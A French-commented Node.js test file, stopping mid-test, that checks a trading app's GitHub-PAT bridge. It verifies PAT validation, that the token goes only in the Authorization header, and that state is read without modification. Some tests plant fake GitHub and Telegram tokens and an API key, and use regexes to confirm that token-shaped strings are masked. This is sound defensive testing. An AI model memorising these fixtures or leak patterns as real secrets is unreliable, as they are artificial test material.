// banc-pont-direct.js — [PONT DIRECT · 11/10/2026] VERSION 20261011a
// Le pont (js/17-pont-lecture.js + js/17b-pont-direct.js) exécuté TEL QUEL dans une vm, contre un faux GitHub en mémoire
// (banc-fixtures/faux-github.js), avec les VRAIS portefeuilles et accesseurs de 02 (_freshWallet … _installWalletAccessors), le VRAI
// habillage de fetch de 00 (window._auraLastOp) et le VRAI export de 10h (exportForClaude) pour l'enveloppe du backup. Horloge et
// minuteries simulées : une heure se joue en quelques ms.
// Ce que le banc tient : inertie sans PAT · PAT refusé s'il est classique, s'il peut écrire dans le dépôt du code, si aura-pont est
// public · le PAT ne part que dans Authorization vers les deux adresses permises, jamais dans un texte · S identique avant / après,
// aucun accesseur appelé · liste fermée de demandes, servies une fois, périmées, bornées · le battement (etat.json) jamais affamé
// par les demandes, une demande fraîche jamais bloquée par des demandes en retard · débit et pauses · coupe-circuit.
// Les deux relectures adverses du 11/10 (agents séparés) ont donné les essais marqués « relecture ».
// Usage : node banc-pont-direct.js [<17b à tester>] [<17 à tester>]   (les deux arguments servent aux mutations ; défaut : js/)
'use strict';
const fs = require('fs'), vm = require('vm'), assert = require('assert'), path = require('path'), zlib = require('zlib');
const M = require('./banc-fixtures/pont-monde.js')({ pont: process.argv[2], lect: process.argv[3] });
const { monde, empreinte, between, codeStrict, rd, J, ROOT, F17, F17B, HTML, TOK, O, DEPOT, SONDE, T0, MIN, H, EXPORT_10H, PAT_OK, PAT_LARGE, PAT_RO, PAT_AUTRE, PAT_MORT, PAT_CLASSIQUE } = M;
// [GO DÉMO · 12/10/2026] la version PROPRE du pont (17, 17b, rejeu/pont.js) est celle de sa livraison ; le jeton du document (TOK, lu dans le HTML), lui, avance à
// chaque livraison. Avant, ce banc comparait les deux au même TOK : il cassait à la première livraison qui ne retouchait pas le pont.
const PONT_TOK = '20261011a';
let pass = 0, fail = 0;
const TESTS = [];
function T(name, fn) { TESTS.push([name, fn]); }
const chemins = L => L.map(r => r.m + ' ' + r.url.replace(O, ''));
const ligne = X => X.els.pontDirectEtat.textContent;
const mem = X => JSON.parse(X.ls.get('aura_pont_mem'));
const CONTROLE = ['GET aura-pont', 'GET aura/contents/' + F17B, 'PUT aura/contents/' + F17B];   // le contrôle du PAT : dépôt, fichier-témoin, écriture impossible
const sondes = X => X.gh.journal.filter(r => r.m === 'PUT' && r.url === SONDE).length;
const seme = (n, age) => JSON.stringify({ ecrits: Array.from({ length: n }, (_, i) => T0 - age - i) });   // une mémoire avec n écritures déjà comptées

// ───────────── A · inertie ─────────────
T('P1 · sans PAT : aucune minuterie, aucune requête, aucun écouteur d\'erreur, aucune écriture ; une seule lecture de localStorage (aura_pont_pat) ; S identique ; une heure passe : toujours rien', async () => {
  const X = monde({ sansCharger: true }), S = X.run('S'), e0 = empreinte(S);
  X.charger(); await X.avancer(H);
  assert.strictEqual(X.timers.size, 0); assert.deepStrictEqual(X.stats.intervals, []); assert.strictEqual(X.gh.journal.length, 0); assert.deepStrictEqual(X.winL, []);
  assert.deepStrictEqual(X.lsJ, [['get', 'aura_pont_pat']]);
  assert.strictEqual(empreinte(S), e0); assert.deepStrictEqual(X.stats.acc, { get: 0, set: 0 }); assert.strictEqual(X.stats.alea, 0);
  assert.strictEqual(X.st().etat, 'coupe'); assert.strictEqual(typeof X.c.pontDirectActiver, 'function'); assert.strictEqual(X.c._auraLastOp, undefined);
});
T('P2 · la ligne du panneau Outils : posée tout de suite si la page est chargée, sinon au DOMContentLoaded (aucune minuterie) ; après la barre d\'export de 10h si elle existe, sinon après les onglets ; 3 boutons → fonctions window ; texte « coupé »', async () => {
  let X = monde({ readyState: 'loading' });
  assert.strictEqual(X.els.pontDirectBar, undefined); assert.strictEqual(X.docL.length, 1); assert.strictEqual(X.docL[0][0], 'DOMContentLoaded'); assert.strictEqual(X.timers.size, 0);
  X.docL[0][1]();
  const bar = X.els.pontDirectBar; assert.ok(bar && bar._avant === X.tabs && bar._pos === 'afterend');
  const on = [...bar.innerHTML.matchAll(/onclick="([^"]+)"/g)].map(m => m[1]);
  assert.deepStrictEqual(on, ['pontDirectActiver()', 'pontDirectEnvoyer()', 'pontDirectCouper()']);
  on.forEach(f => assert.strictEqual(typeof X.c[f.replace('()', '')], 'function', f));
  assert.ok(bar.innerHTML.includes('type="password"') && bar.innerHTML.includes('autocomplete="off"') && bar.innerHTML.includes('Pont direct ' + PONT_TOK));
  assert.ok(/^coupé · colle le PAT/.test(ligne(X))); assert.strictEqual(X.els.pontDirectSaisie.style.display, 'flex'); assert.strictEqual(X.els.pontDirectActions.style.display, 'none');
  X.docL[0][1](); assert.strictEqual(X.els.pontDirectBar, bar, 'une seule barre');
  X = monde({ barre10h: true }); assert.strictEqual(X.els.pontDirectBar._avant, X.els.claudeExportBar);
  X = monde({ sansOnglets: true }); assert.strictEqual(X.els.pontDirectBar, undefined);
});

// ───────────── B / C · le PAT : format, contrôles, rien n'est gardé avant les contrôles et une écriture ─────────────
T('P3 · PAT classique (ghp_…) ou texte quelconque : refusé SANS aucune requête, rien gardé, champ vidé ; champ vide : rien', async () => {
  const X = monde();
  await X.activer(PAT_CLASSIQUE);
  assert.strictEqual(X.gh.journal.length, 0); assert.ok(!X.ls.has('aura_pont_pat')); assert.ok(ligne(X).includes('PAT classique refusé'), ligne(X));
  assert.strictEqual(X.els.pontDirectPat.value, ''); assert.strictEqual(X.timers.size, 0);
  await X.activer('bonjour'); assert.ok(ligne(X).includes('github_pat_')); assert.strictEqual(X.gh.journal.length, 0);
  await X.activer('   '); assert.ok(ligne(X).includes('colle d\'abord')); assert.strictEqual(X.gh.journal.length, 0);
  await X.activer(PAT_OK.slice(0, 40) + '!' + PAT_OK.slice(41)); assert.strictEqual(X.gh.journal.length, 0, 'un caractère hors alphabet : format');
  assert.ok(!X.ls.has('aura_pont_pat') && !X.ls.has('aura_pont_mem'));
});
T('P4 · PAT bon : 4 requêtes dans l\'ordre (dépôt, fichier-témoin du code, écriture impossible, etat.json) PUIS le PAT est gardé ; espaces et retours du collage retirés ; minuterie 15 s ; champ vidé ; ligne « actif » ; boutons basculés', async () => {
  const X = monde();
  await X.activer('  ' + PAT_OK.slice(0, 30) + ' \n' + PAT_OK.slice(30) + '\n');
  assert.deepStrictEqual(chemins(X.gh.journal), CONTROLE.concat(['PUT aura-pont/contents/etat.json']));
  const iSet = X.lsJ.findIndex(x => x[0] === 'set' && x[1] === 'aura_pont_pat'); assert.ok(iSet >= 0); assert.strictEqual(X.ls.get('aura_pont_pat'), PAT_OK);
  assert.deepStrictEqual(X.stats.intervals, [15000]); assert.strictEqual(X.els.pontDirectPat.value, ''); assert.strictEqual(X.timers.size, 1, 'la minuterie du pont, rien d\'autre');
  assert.ok(/^✅ actif · état envoyé \d\d:\d\d:\d\d · 0 demande/.test(ligne(X)), ligne(X));
  assert.strictEqual(X.els.pontDirectSaisie.style.display, 'none'); assert.strictEqual(X.els.pontDirectActions.style.display, 'flex');
  assert.deepStrictEqual(X.winL.map(x => x[0]).sort(), ['error', 'unhandledrejection']);
  const s = X.gh.journal[2]; assert.strictEqual(s.corps.sha, '0'.repeat(40)); assert.strictEqual(s.url, SONDE); assert.strictEqual(X.gh.ecritsCode, 0);
  assert.strictEqual(mem(X).ecrits.length, 2, 'l\'écriture de contrôle compte, comme celle de etat.json');
  const w = X.appels.filter(a => a.m === 'PUT'); assert.strictEqual(w[1].t - w[0].t, 2000, '2 s entre l\'écriture de contrôle et etat.json');
});
T('P5 · etat.json : version chargée, mode à l\'écran, les trois modes (play, portefeuille, positions), tendance, performances, réseau, moteur, enregistreur, arrêts de la tablette, erreurs, état du pont ; une rubrique illisible n\'empêche pas le reste (relecture)', async () => {
  const X = monde({ ls: { aura_throttle_log: JSON.stringify(Array.from({ length: 7 }, (_, i) => ({ t: '1' + i + '/10/2026 07:22:01', gapS: 44640 + i }))) } });
  await X.activer(PAT_OK);
  const e = JSON.parse(X.gh.texte('etat.json'));
  assert.strictEqual(e.pont, 1); assert.strictEqual(e.v, PONT_TOK); assert.strictEqual(e.doc, TOK); assert.strictEqual(e.t, T0 + 2000); assert.strictEqual(e.iso, '2026-10-11T09:45:14.000Z'); assert.strictEqual(e.fuseauMin, new Date(T0).getTimezoneOffset());
  assert.ok(/^[a-z0-9]{6,16}$/.test(e.inst)); assert.strictEqual(e.natif, true); assert.strictEqual(e.pret, true); assert.strictEqual(e.enLigne, true); assert.strictEqual(e.visible, 'visible'); assert.deepStrictEqual(e.scripts, { n: 2, jetons: { [TOK]: 2 } });
  assert.strictEqual(e.ecran, 'paperReal'); assert.strictEqual(e.cycle, 1253765);
  assert.deepStrictEqual(Object.keys(e.modes), ['sim', 'paperReal', 'real']);
  assert.deepStrictEqual(e.modes.paperReal, { play: true, portefeuille: 1085.46, trading: 900.5, caisse: 184.96, trades: 342, gagnants: 180, nPos: 2, positions: [
    { id: 'p1abc', paire: 'BTC/USDT', sens: 'long', auto: true, entree: 61234.5678, mise: 50, pnl: 0.422, pnlUsdt: 0.211, ouverte: T0 - 120000 },
    { id: 'p2', paire: 'PEPE/USDT', sens: 'short', auto: false, entree: 0.00001234, mise: 25, pnl: -1.2, pnlUsdt: -0.3, ouverte: T0 - 60000 }] });
  assert.strictEqual(e.modes.sim.play, true); assert.strictEqual(e.modes.sim.portefeuille, 1055.33); assert.strictEqual(e.modes.real.play, false); assert.strictEqual(e.modes.real.portefeuille, 1145.42);
  assert.deepStrictEqual(e.tendance, { ouvertes: 1, net: 0.0123, trades: 3 });
  assert.deepStrictEqual(Object.keys(e.perf), ['boot', 'gel', 'lent', 'heap', 'net'], 'le dernier de chaque journal, aucune longueur (les journaux de l\'app sont plafonnés)');
  assert.strictEqual(e.perf.boot.cycle, 1235415); assert.deepStrictEqual(e.perf.gel, { t: T0 - 9e6, gap: 3.2, op: 'guardianDownload' }); assert.strictEqual(e.perf.net.err, 'Failed to fetch'); assert.strictEqual(e.perf.lent.dur, 1408); assert.strictEqual(e.avalees, 1);
  assert.deepStrictEqual(e.reseau, { hors: false, prixAge: 14, connexion: { type: 'wifi', effectif: '4g', rtt: 50, debit: 9.5, eco: false } });
  assert.deepStrictEqual(e.moteur, { battement: true, chrono: { mode: 'paperReal', enMarche: true, secondes: { sim: 100, paperReal: 200, real: 0 } }, veille: { voulue: true, tenue: false } });
  assert.deepStrictEqual(e.rec, { lignes: 4200, vidages: 60, dernierVidage: T0 - 30000, perdues: 0, dernierFichier: 'EXTERNAL_STORAGE:Download/AURA/aura_guardian_full_rec-20261010.json', err: null, warn: null });
  assert.deepStrictEqual(e.tl, { dernierTick: T0 - 20000, running: true, err: null, errAt: 0 });
  assert.strictEqual(e.arrets.n, 7); assert.strictEqual(e.arrets.derniers.length, 5, 'les 5 arrêts les plus récents'); assert.deepStrictEqual(e.arrets.derniers[0], { t: '10/10/2026 07:22:01', gapS: 44640 });
  assert.deepStrictEqual(e.erreurs, { n: 0, dernieres: [] });
  assert.deepStrictEqual(e.etatPont, { etat: 'verif', servis: 0, refus: 0, echecs: 0, ecritsH: 1, quota: 4999, err: null, errAt: 0, releveAt: 0, pauseUntil: 0, tics: 0, ticMax: 0 });
  const txt = X.gh.texte('etat.json'); assert.ok(txt.length < 4000, 'etat.json court : ' + txt.length); assert.ok(!/CLE-COINSTATS|ABC-SECRET/.test(txt));
  X.run('window._auraNetOffline = true; window._auraSimState.running = false; delete window.RT; document.visibilityState = "hidden"; _wakeLockEnabled = false; _wakeLockSentinel = {}; window._tlStatus.running = false;'); const e2 = J(X.c._pontLecture.etat());
  assert.deepStrictEqual(e2.reseau, { hors: true, prixAge: null, connexion: e.reseau.connexion }); assert.strictEqual(e2.moteur.battement, false); assert.strictEqual(e2.visible, 'hidden'); assert.deepStrictEqual(e2.moteur.veille, { voulue: false, tenue: true }); assert.strictEqual(e2.tl.running, false);
  X.run('delete window.AuraChrono; delete window._auraSimState; delete window._recStatus; delete window._tlStatus.running; delete navigator.connection;'); const e3 = J(X.c._pontLecture.etat());
  assert.deepStrictEqual(e3.moteur, { battement: false, chrono: null, veille: { voulue: false, tenue: true } }); assert.strictEqual(e3.reseau.connexion, null); assert.strictEqual('rec' in e3, false); assert.strictEqual(e3.tl.running, null);
  // une rubrique qui ne se lit pas (ici un Proxy révoqué dans S.tendance) : { _err } dans SA rubrique, tout le reste part
  X.run('var pr = Proxy.revocable({}, {}); S.tendance.pos = pr.proxy; pr.revoke();'); const e4 = J(X.c._pontLecture.etat());
  assert.ok(e4.tendance && typeof e4.tendance._err === 'string', JSON.stringify(e4.tendance)); assert.strictEqual(e4.modes.paperReal.nPos, 2); assert.strictEqual(e4.cycle, 1253765); assert.ok(e4.arrets && e4.perf);
  assert.strictEqual(J(X.c._pontLecture.copie(X.run('S.tendance'), 2)).pos, '[interdit]', 'un objet qui lève à l\'examen n\'est pas ouvert');
});
T('P6 · PAT qui peut ÉCRIRE dans le dépôt du code (l\'écriture impossible répond 409, 422, 200 ou 201) : refusé, rien gardé, AUCUNE écriture dans aura-pont, le dépôt du code n\'est pas touché', async () => {
  for (const st of [409, 422, 200, 201]) {
    const X = monde();
    if (st !== 409) X.gh.panne(r => (r.m === 'PUT' && r.url === SONDE ? { st, j: { message: 'cas ' + st } } : null));
    await X.activer(PAT_LARGE);
    assert.deepStrictEqual(chemins(X.gh.journal), CONTROLE, 'cas ' + st);
    assert.ok(!X.ls.has('aura_pont_pat')); assert.ok(ligne(X).includes('peut ÉCRIRE dans le dépôt du code'), ligne(X));
    assert.strictEqual(X.gh.existe('etat.json'), false); assert.strictEqual(X.gh.ecritsCode, 0); assert.strictEqual(X.timers.size, 0); assert.strictEqual(X.els.pontDirectPat.value, '');
    await X.avancer(10 * MIN); assert.strictEqual(X.gh.journal.length, 3);
  }
});
T('P7 · aura-pont PUBLIC, sans le champ « private », ou avec GitHub Pages : refusé avant même le dépôt du code ; PAT d\'un autre compte (404 / 403) ou révoqué (401) : refusé ; dépôt d\'un autre nom : refusé (casse indifférente) ; GitHub qui demande d\'attendre : rien gardé, le champ garde le PAT', async () => {
  let X = monde({ prive: false }); await X.activer(PAT_OK);
  assert.deepStrictEqual(chemins(X.gh.journal), ['GET aura-pont']); assert.ok(ligne(X).includes('PUBLIC')); assert.ok(!X.ls.has('aura_pont_pat'));
  X = monde(); X.gh.prive = undefined; await X.activer(PAT_OK); assert.ok(ligne(X).includes('PUBLIC'), '« private » absent de la réponse : pas privé'); assert.deepStrictEqual(chemins(X.gh.journal), ['GET aura-pont']);
  X = monde(); X.gh.pages = true; await X.activer(PAT_OK); assert.ok(ligne(X).includes('GitHub Pages'), ligne(X)); assert.deepStrictEqual(chemins(X.gh.journal), ['GET aura-pont']); assert.ok(!X.ls.has('aura_pont_pat'));
  X = monde(); await X.activer(PAT_AUTRE);
  assert.deepStrictEqual(chemins(X.gh.journal), ['GET aura-pont']); assert.ok(ligne(X).includes('ne voit pas aura-pont') && ligne(X).includes('GitHub 404'));
  X = monde(); X.gh.panne(r => ({ st: 403, j: { message: 'Forbidden' } })); await X.activer(PAT_OK); assert.ok(ligne(X).includes('ne voit pas aura-pont') && ligne(X).includes('GitHub 403')); assert.strictEqual(X.els.pontDirectPat.value, '');
  X = monde(); await X.activer(PAT_MORT);
  assert.ok(ligne(X).includes('GitHub 401') && ligne(X).includes('Bad credentials')); assert.ok(!X.ls.has('aura_pont_pat'));
  X = monde(); X.gh.nom = 'ramizxhixha-a11y/autre'; await X.activer(PAT_OK);
  assert.ok(ligne(X).includes('dépôt inattendu')); assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.gh.existe('etat.json'), false);
  X = monde(); X.gh.nom = 'RamizXhixha-A11y/Aura-Pont'; await X.activer(PAT_OK); assert.strictEqual(X.st().etat, 'actif', 'GitHub ne tient pas compte de la casse');
  for (const rep of [{ st: 429, j: { message: 'Too Many Requests' }, h: { 'retry-after': '30' } }, { st: 403, j: { message: 'secondary rate limit' }, h: { 'retry-after': '30' } }, { st: 500, j: { message: 'Server Error' } }, { st: 200, brut: '<html>' }]) {
    X = monde(); X.gh.panne(() => rep); await X.activer(PAT_OK);
    assert.ok(/GitHub demande d'attendre|aura-pont ne répond pas/.test(ligne(X)), ligne(X)); assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.els.pontDirectPat.value, PAT_OK); assert.strictEqual(X.gh.journal.length, 1);
  }
});
T('P8 · contrôle du dépôt du code non concluant (500, 403 sans le motif attendu, limite de débit, réseau coupé) : pas activé, rien gardé, rien écrit ; le champ garde le PAT 10 min au plus ; un 404 à l\'écriture ne vaut refus d\'accès que si le fichier-témoin a été LU (relecture)', async () => {
  const put = r => r.m === 'PUT' && r.url === SONDE, get = r => r.m === 'GET' && r.url === SONDE;
  for (const rep of [{ st: 500, j: { message: 'Server Error' } }, { st: 403, j: { message: 'Repository access blocked' } }, { st: 403, j: { message: 'You have exceeded a secondary rate limit' }, h: { 'retry-after': '60' } },
    { st: 403, j: { message: 'Resource not accessible by personal access token' }, h: { 'retry-after': '60' } }, 'reseau']) {
    const X = monde(); X.gh.panne(r => (put(r) ? rep : null));
    await X.activer(PAT_OK);
    assert.ok(!X.ls.has('aura_pont_pat'), JSON.stringify(rep)); assert.strictEqual(X.gh.existe('etat.json'), false); assert.strictEqual(X.stats.intervals.length, 0);
    assert.ok(/non concluant|réseau/.test(ligne(X)), ligne(X));
    assert.strictEqual(X.els.pontDirectPat.value, PAT_OK); assert.strictEqual(X.st().etat, 'coupe');
    await X.avancer(10 * MIN - 3000); assert.strictEqual(X.els.pontDirectPat.value, PAT_OK); await X.avancer(3000); assert.strictEqual(X.els.pontDirectPat.value, '', 'champ vidé après 10 min'); assert.strictEqual(X.timers.size, 0);
  }
  // le fichier-témoin et le sens d'un 404
  let X = monde(); X.gh.panne(r => (put(r) ? { st: 404, j: { message: 'Not Found' } } : null)); await X.activer(PAT_OK);
  assert.strictEqual(X.st().etat, 'actif', 'témoin lu (200) puis 404 à l\'écriture : refus d\'accès, PAT accepté');
  X = monde(); X.gh.codeFichiers = {}; X.gh.panne(r => (put(r) ? { st: 404, j: { message: 'Not Found' } } : null)); await X.activer(PAT_OK);
  assert.strictEqual(X.st().etat, 'coupe'); assert.ok(/non concluant .*fichier-témoin non lu \(GitHub 404/.test(ligne(X)), ligne(X)); assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.gh.existe('etat.json'), false);
  X = monde(); X.gh.codeFichiers = {}; await X.activer(PAT_OK);
  assert.strictEqual(X.st().etat, 'actif', 'témoin non lu mais 403 explicite à l\'écriture : le motif suffit');
  X = monde(); X.gh.panne(r => (get(r) ? { st: 200, j: { type: 'dir' } } : (put(r) ? { st: 404, j: { message: 'Not Found' } } : null))); await X.activer(PAT_OK);
  assert.strictEqual(X.st().etat, 'coupe', 'un témoin qui n\'est pas un fichier n\'est pas un témoin');
  for (const quand of [get, put]) {
    X = monde(); X.gh.panne(r => (quand(r) ? { st: 401, j: { message: 'Bad credentials' } } : null)); await X.activer(PAT_OK);
    assert.ok(ligne(X).includes('PAT refusé par GitHub') && ligne(X).includes('401'), ligne(X)); assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.els.pontDirectPat.value, '');
  }
  X = monde(); X.gh.panne(r => (get(r) ? { st: 429, j: { message: 'Too Many Requests' }, h: { 'retry-after': '90' } } : null)); await X.activer(PAT_OK);
  assert.ok(ligne(X).includes('GitHub demande d\'attendre'), ligne(X)); assert.strictEqual(sondes(X), 0, 'l\'écriture de contrôle ne part pas');
  // quota d'écritures du pont déjà plein (60 dans l'heure, gardées d'un rechargement à l'autre) : l'écriture de contrôle ne part pas non plus
  X = monde({ ls: { aura_pont_mem: seme(60, 1000) } }); await X.activer(PAT_OK);
  assert.ok(ligne(X).includes('quota d\'écritures du pont atteint'), ligne(X)); assert.strictEqual(sondes(X), 0); assert.ok(!X.ls.has('aura_pont_pat'));
});
T('P9 · PAT en lecture seule sur aura-pont (l\'écriture de etat.json répond 403) : refusé, rien gardé ; réseau qui lâche à cette écriture : le champ garde le PAT ; stockage de l\'appareil qui refuse : rien d\'actif ; mémoire du pont seule refusée : dit à l\'écran', async () => {
  let X = monde(); await X.activer(PAT_RO);
  assert.deepStrictEqual(chemins(X.gh.journal), CONTROLE.concat(['PUT aura-pont/contents/etat.json']));
  assert.ok(!X.ls.has('aura_pont_pat')); assert.ok(ligne(X).includes('écriture refusée') && ligne(X).includes('GitHub 403')); assert.strictEqual(X.timers.size, 0); assert.strictEqual(X.els.pontDirectPat.value, '');
  X = monde(); X.gh.panne(r => (/etat\.json$/.test(r.url) ? 'reseau' : null)); await X.activer(PAT_OK);
  assert.ok(/réseau : Failed to fetch — réessaie/.test(ligne(X)), ligne(X)); assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.els.pontDirectPat.value, PAT_OK, 'inutile de le recoller');
  X = monde({ lsRefuse: true }); await X.activer(PAT_OK);
  assert.ok(ligne(X).includes('stockage')); assert.strictEqual(X.timers.size, 0); assert.strictEqual(X.st().etat, 'coupe');
  await X.avancer(10 * MIN); assert.strictEqual(X.gh.journal.length, 4);
  X = monde({ lsRefuse: 'aura_pont_mem' }); await X.activer(PAT_OK);
  assert.strictEqual(X.st().etat, 'actif'); assert.ok(/dernier incident .*la mémoire du pont n'est pas gardée/.test(ligne(X)), ligne(X));
  const b9 = X.demande(1, 'backup'); await X.jusqua(() => X.rep(b9) !== null); await X.avancer(3 * MIN);
  const p9 = X.demande(2, 'ping'); await X.jusqua(() => X.rep(p9) !== null); await X.avancer(MIN);   // la liste change : son ETag ne protège plus
  assert.strictEqual(X.puts(/reponses/).length, 2, 'mémoire non sauvée : celle de la page fait foi, la demande n\'est pas reprise à chaque battement'); assert.strictEqual(X.gh.chemins().filter(p => p.startsWith('backups/a')).length, 1);
});

// ───────────── D · où part le PAT ─────────────
async function scenarioComplet(X) {
  await X.activer(PAT_OK);
  const ids = [X.demande(1, 'ping'), X.demande(2, 'etat'), X.demande(3, 'diag')];
  await X.avancer(40000);
  ids.push(X.demande(4, 'lire', { quoi: 'S', chemin: [], prof: 3 }), X.demande(5, 'backup'));
  await X.jusqua(() => X.gh.existe('reponses/' + ids[3] + '.json') && X.gh.existe('reponses/' + ids[4] + '.json'));
  await X.avancer(6 * MIN);
  return ids;
}
T('P10 · scénario complet (activation, états, 5 demandes dont un backup) : toute requête va à aura-pont ou à l\'unique adresse du contrôle ; redirections interdites, pas de cache, pas de cookies ; le PAT n\'est QUE dans Authorization', async () => {
  const X = monde(); const ids = await scenarioComplet(X);
  ids.forEach(id => assert.strictEqual(X.rep(id).ok, true, id + ' ' + JSON.stringify(X.rep(id)).slice(0, 200)));
  assert.ok(X.gh.journal.length > 20);
  for (const r of X.gh.journal) {
    assert.ok(r.url === DEPOT || r.url.startsWith(DEPOT + '/contents/') || r.url === SONDE, r.url);
    assert.deepStrictEqual(r.opt, { cache: 'no-store', redirect: 'error', credentials: 'omit', referrerPolicy: 'no-referrer', signal: true });
    assert.strictEqual(r.h.Authorization, 'Bearer ' + PAT_OK); assert.strictEqual(r.h.Accept, 'application/vnd.github+json');
    assert.deepStrictEqual(Object.keys(r.h).filter(k => !['Authorization', 'Accept', 'If-None-Match', 'Content-Type'].includes(k)), [], 'en-têtes hors de la liste CORS de GitHub');
    assert.ok(!r.url.includes(PAT_OK)); assert.ok(r.brut === null || !r.brut.includes(PAT_OK));
    Object.keys(r.h).forEach(k => { if (k !== 'Authorization') assert.ok(!String(r.h[k]).includes(PAT_OK)); });
  }
  assert.deepStrictEqual(chemins(X.gh.journal.filter(r => r.url === SONDE)), CONTROLE.slice(1), 'le dépôt du code : une lecture, une écriture impossible'); assert.strictEqual(X.gh.ecritsCode, 0);
  // nulle part ailleurs : fichiers du dépôt, console, écran, mémoire du pont, état exposé
  X.gh.chemins().forEach(p => { const b = Buffer.from(X.gh.octets(p)); const t = p.endsWith('.gz') ? zlib.gunzipSync(b).toString('utf8') : b.toString('utf8'); assert.ok(!t.includes(PAT_OK), p); });
  assert.ok(!X.sorties.join('\n').includes(PAT_OK)); Object.values(X.els).forEach(e => { assert.ok(!String(e.textContent).includes(PAT_OK) && !String(e.value).includes(PAT_OK) && !String(e._html).includes(PAT_OK)); });
  assert.deepStrictEqual([...X.ls.keys()].filter(k => X.ls.get(k).includes(PAT_OK)), ['aura_pont_pat']); assert.ok(!JSON.stringify(X.st()).includes(PAT_OK));
  assert.ok(!JSON.stringify(X.run('JSON.stringify(Object.keys(window._pont))')).includes('pat')); assert.strictEqual(X.run('typeof window._pont.gh'), 'undefined');
});
T('P11 · dernier filet : un PAT qui se serait glissé dans S ne part dans AUCUN texte (etat.json, diag, lire, backup compressé ou en clair) → « [PAT masqué] » ; même COUPÉ en route, comme tout texte en forme de jeton GitHub ou Telegram, et comme la valeur des secrets de S (relecture)', async () => {
  for (const sansGzip of [false, true]) {
    const X = monde({ sansGzip });
    X.run('S.chainLog.push({ icon: "x", desc: "jeton ' + PAT_OK + ' vu, clé CLE-COINSTATS-SECRETE-123 vue", time: "t" }); S.fuite = "' + PAT_OK + '"; S.long = "' + 'z'.repeat(1970) + ' ' + PAT_OK + '";'
      + 'S.perfLog.gels.push({ t: 5, gap: 4, op: "fetch api.telegram.org/' + ['bot123456789', 'AAEabcdefghijklmnopqrstuvwx-Yz'].join(':') + '/sendMessage" }); S.autre = "vu ' + ['ghp', 'AutreJetonClassique0123456789'].join('_') + ' et ' + PAT_LARGE + ' ici";');
    await X.activer(PAT_OK);
    const etat = X.gh.texte('etat.json'); assert.ok(etat.includes('bot[masqué]') && !/AAEabc/.test(etat), 'jeton Telegram coupé à 60 caractères dans le dernier gel : ' + JSON.parse(etat).perf.gel.op);
    const d = X.demande(1, 'diag'), l = X.demande(2, 'lire', { quoi: 'S', chemin: ['fuite'] }), l2 = X.demande(3, 'lire', { quoi: 'S', chemin: ['long'] }), l3 = X.demande(4, 'lire', { quoi: 'S', chemin: ['autre'] }), b = X.demande(5, 'backup');
    await X.jusqua(() => [d, l, l2, l3, b].every(id => X.gh.existe('reponses/' + id + '.json')));
    assert.ok(X.rep(d).ok && X.rep(b).ok, JSON.stringify(X.rep(b)));
    assert.strictEqual(X.rep(l).r.v, '[PAT masqué]'); assert.ok(JSON.stringify(X.rep(d).r.journal).includes('jeton [PAT masqué] vu, clé [masqué] vue'));
    assert.ok(/ github_pat_\[masqué\]… \[\d+ car\.\]$/.test(X.rep(l2).r.v), 'PAT coupé par la borne de 2 000 caractères : ' + X.rep(l2).r.v.slice(-60));
    assert.strictEqual(X.rep(l3).r.v, 'vu ghp_[masqué] et github_pat_[masqué] ici');
    const f = X.rep(b).r.fichier; assert.strictEqual(X.rep(b).r.gz, !sansGzip); assert.ok(f.endsWith(sansGzip ? '.json' : '.json.gz'));
    const brut = Buffer.from(X.gh.octets(f)), txt = sansGzip ? brut.toString('utf8') : zlib.gunzipSync(brut).toString('utf8');
    assert.ok(txt.includes('[PAT masqué]') && !txt.includes(PAT_OK) && !txt.includes('CLE-COINSTATS-SECRETE-123'));
    for (const p of X.gh.chemins()) { const o = Buffer.from(X.gh.octets(p)), t = p.endsWith('.gz') ? zlib.gunzipSync(o).toString('utf8') : o.toString('utf8'); assert.ok(!/github_pat_[A-Za-z0-9_]{6,}|ghp_[A-Za-z0-9]{6,}|bot\d{5,}:[\w-]/.test(t) && !/CLE-COINSTATS|ABC-SECRET/.test(t), p); }
    X.gh.journal.forEach(r => assert.ok(r.brut === null || !r.brut.includes(PAT_OK)));
  }
});

// ───────────── E · lecture seule ─────────────
T('P12 · S IDENTIQUE avant / après (empreinte par descripteurs) : activation, 12 états, toutes les commandes, backup ; le pont n\'appelle aucun accesseur de 02, ni le piège ; jamais Math.random, showToast, _decErr ; _perfOp : une annonce par demande lourde', async () => {
  const X = monde(), S = X.run('S'), e0 = empreinte(S);
  const ids = await scenarioComplet(X); await X.avancer(H);
  assert.ok(ids.every(id => X.rep(id).ok)); assert.ok(X.puts(/etat\.json$/).length >= 12);
  assert.strictEqual(empreinte(S), e0); assert.deepStrictEqual(X.stats.acc, { get: 0, set: 0 }); assert.strictEqual(X.run('S._piegeTouche'), undefined);
  assert.strictEqual(X.stats.alea, 0); assert.strictEqual(X.stats.toast, 0); assert.strictEqual(X.stats.decErr, 0);
  assert.deepStrictEqual(X.stats.ops, ['pont:diag', 'pont:backup', 'pont:lire'], 'ni ping ni etat ne s\'annoncent ; la plus récente d\'abord');
  assert.deepStrictEqual([...new Set(X.lsJ.filter(x => x[0] !== 'get').map(x => x[1]))].sort(), ['aura_pont_mem', 'aura_pont_pat'], 'seules clés écrites');
  assert.deepStrictEqual([...new Set(X.lsJ.filter(x => x[0] === 'get').map(x => x[1]))].sort(), ['aura_pont_mem', 'aura_pont_pat', 'aura_throttle_log'], 'seules clés lues');
  const lu = X.rep(ids[3]).r.v; assert.strictEqual(lu.portfolio, 1085.46, 'champ de portefeuille lu dans S.walletStore[mode à l\'écran]'); assert.strictEqual(lu.piege, '[accesseur non appelé]'); assert.strictEqual(lu.openPositions.length, 2);
});
T('P13 · portefeuille absent : l\'accesseur RÉEL de 02 le crée (contrôle), la lecture du pont non ; pendant une bascule de contexte (_bgResolve), le mode à l\'écran est celui de _bgFrom', async () => {
  const X = monde(), L = X.c._pontLecture;
  X.run('delete S.walletStore.real; S.tradingMode = "real";');
  const r = J(L.lire({ quoi: 'S', chemin: ['portfolio'] }));
  assert.strictEqual(r.v, '[accesseur non appelé]'); assert.strictEqual(X.run('S.walletStore.real'), undefined); assert.strictEqual(L.etat().modes.real, null); assert.strictEqual(X.run('S.walletStore.real'), undefined);
  assert.strictEqual(X.stats.acc.get, 0);
